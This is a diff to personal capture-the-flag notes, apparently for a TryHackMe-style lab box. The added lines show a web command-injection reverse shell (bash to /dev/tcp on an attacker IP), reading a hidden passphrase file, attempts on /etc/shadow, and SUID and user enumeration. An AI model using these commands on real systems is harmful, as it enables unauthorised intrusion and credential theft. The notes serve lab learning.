@@ -14,7 +14,7 @@
 1. http://school.thm/assets/index.php?cmd=whoami gives us d3d3LWRhdGEK
 2. base 64 decode shows user is www-data
 3. http://school.thm/assets/index.php?cmd=cat /etc/apache2/sites-enabled/000-default.conf reveals some info see apache_conf.txt
-4. we are able to reverse shell
+4. we are able to reverse shell http://school.thm/assets/index.php?cmd=bash -i >& /dev/tcp/<attack ip>/4444 0>&1
 
 ## Reverse Shell
 
@@ -69,4 +69,111 @@ tmpfs                              481M     0  481M   0% /sys/fs/cgroup
 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /snap/core20/1828/usr/lib/openssh/ssh-keysign
 /snap/snapd/18357/usr/lib/snapd/snap-confine
+9. www-data@myheroacademia:/var/www/html/assets$ find / -writable -type f 2>/dev/null
+cat /etc/passwd | grep bash/var/www/html/assets/images/yuei.jpg
+/var/www/html/assets/images/oneforall.jpg
+/var/www/html/assets/index.php
+/var/www/html/index.html
+/var/www/html/about.html
+/var/www/html/admissions.html
+/var/www/html/contact.html
+/var/www/html/courses.html
+/var/www/Hidden_Content/passphrase.txt
+10. www-data@myheroacademia:/var/www/html/assets$ cat /var/www/Hidden_Content/passphrase.txt
+QWxsbWlnaHRGb3JFdmVyISEhCg== : AllmightForEver!!!
+11. www-data@myheroacademia:/var/www/html/assets$ cat /etc/passwd | cut -d: -f1
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+systemd-network
+systemd-resolve
+systemd-timesync
+messagebus
+syslog
+_apt
+tss
+uuidd
+tcpdump
+landscape
+pollinate
+fwupd-refresh
+usbmux
+sshd
+systemd-coredump
+deku
 
+lxd
+
+11. su - deku fail
+12. ssh deku@school.thm fail
+13. www-data@myheroacademia:/var/www/html/assets$ cat /etc/shadow | grep deku
+cat: /etc/shadow: Permission denied
+14. www-data@myheroacademia:/var/www/html/assets$ netstat -tulnp
+ps aux | grep deku(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 10.10.5.150:68          0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:55490           0.0.0.0:*                           -                   
+www-data@myheroacademia:/var/www/html/assets$ 
+15. www-data@myheroacademia:/var/www/html/assets$ ls -la /home/deku/
+total 36
+drwxr-xr-x 5 deku deku 4096 Jul 10  2023 .
+drwxr-xr-x 3 root root 4096 Jul  9  2023 ..
+lrwxrwxrwx 1 root root    9 Jul  9  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 deku deku  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 deku deku 3771 Feb 25  2020 .bashrc
+drwx------ 2 deku deku 4096 Jul  9  2023 .cache
+drwxrwxr-x 3 deku deku 4096 Jul  9  2023 .local
+-rw-r--r-- 1 deku deku  807 Feb 25  2020 .profile
+drwx------ 2 deku deku 4096 Jul  9  2023 .ssh
+-rw-r--r-- 1 deku deku    0 Jul  9  2023 .sudo_as_admin_successful
+-r-------- 1 deku deku   33 Jul 10  2023 user.txt
+16 we found the flag but:
+www-data@myheroacademia:/var/www/html/assets$ cat /home/deku/user.txt
+cat: /home/deku/user.txt: Permission denied
+17. ww-data@myheroacademia:/var/www/html/assets$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/bin/at
+/usr/bin/su
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+18. looking back at the hint unused files : 
+www-data@myheroacademia:/var/www/html/assets$ ls -la images/
+total 336
+drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
+drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
+-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
+-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
+oneforall.jpg isn't used on the site
